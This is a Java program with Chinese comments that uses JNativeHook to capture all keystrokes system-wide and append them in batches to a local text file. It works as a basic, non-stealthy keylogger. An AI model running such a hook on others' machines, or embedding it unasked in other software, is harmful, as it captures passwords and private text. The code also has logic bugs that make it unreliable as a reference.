import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;
import java.util.Map;
import java.util.Set;

public class GlobalKeyListenerExample implements NativeKeyListener {

    public static Map<String ,String > map = Utils.initMap();
    //是否开启大写键，默认为关
    static boolean Capslock = false;
    //shift 是否被按下，这里只用于判断是否需要进行符号替换[ -> {. 默认没有按下
    static boolean isShift = false;
    //用户输入次数，每100次向文件中输入一次以减小IO开销
    public int count = 0;
    //记录这100次的用户输入
    StringBuilder sb = new StringBuilder();
    File file = new File("test.txt");
    FileWriter fw;
    //设定倒计时使用
    private static Date date = new Date();
    private static long startTime = date.getTime();
    private static final Set<String> legalSet = Utils.initLegalSet();
    private static final Map<String, String> upperSymbol = Utils.upperSymbol();


    public void nativeKeyPressed(NativeKeyEvent e) {

        String pressed = NativeKeyEvent.getKeyText(e.getKeyCode());

        //字符串转换，保证单个按键记录中不会出现空格
        if (this.map.containsKey(pressed)){
            pressed = this.map.get(pressed);
        }

        //用户按capslock时切换状态
        if(pressed == "Capslock"){
            Capslock = !Capslock;
        }
        if (pressed == "Shift"){
            Capslock = true;
            isShift = !isShift;
        }

        //处理字母，如果Capslock 没开，转为小写
        if (!Capslock){
            pressed = Utils.toLower(pressed);
        }
        // 处理符号
        if (upperSymbol.containsKey(pressed) && isShift){
            pressed = upperSymbol.get(pressed);
        }

        System.out.println("Key Pressed: " + pressed);
        //如果是不是合法输入则不记录
        //
        if (legalSet.contains(pressed) || pressed == "\n" ){
            sb.append(pressed).append(" ");
            count++;
        }

        //每100次输入写入文件一次，减少IO开销
        if(count >= 100){
            try {
                fw = new FileWriter(file,true);
                String str = sb.toString();
                fw.append(str);
                System.out.println(str + "--------COUNT WRITE--------");
                fw.close();
                sb = new StringBuilder();
                count = 0;
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
        }


        //如果用户长时间输入没有满足字符串长度要求，使用计时器写入
        Date curDate = new Date();
        long currentTime = curDate.getTime();
        //达到要求（ > 10s）存储
        if (Utils.timeCheck(currentTime)){
            try {
                fw = new FileWriter(file,true);
                String str = sb.toString();
                fw.append(str);
                System.out.println(str + "++++++++++TIMER WRITE++++++++++");
                fw.close();
                sb = new StringBuilder();
                count = 0;
                startTime = currentTime;
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
        }

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException nativeHookException) {
                nativeHookException.printStackTrace();
            }
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        if (NativeKeyEvent.getKeyText(e.getKeyCode()) == "Shift"){
            Capslock = !Capslock;
            isShift = !isShift;
        }
    }
//
//    public void nativeKeyTyped(NativeKeyEvent e) {
//        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
//    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        System.out.println("test");

        GlobalScreen.addNativeKeyListener(new GlobalKeyListenerExample());
    }
}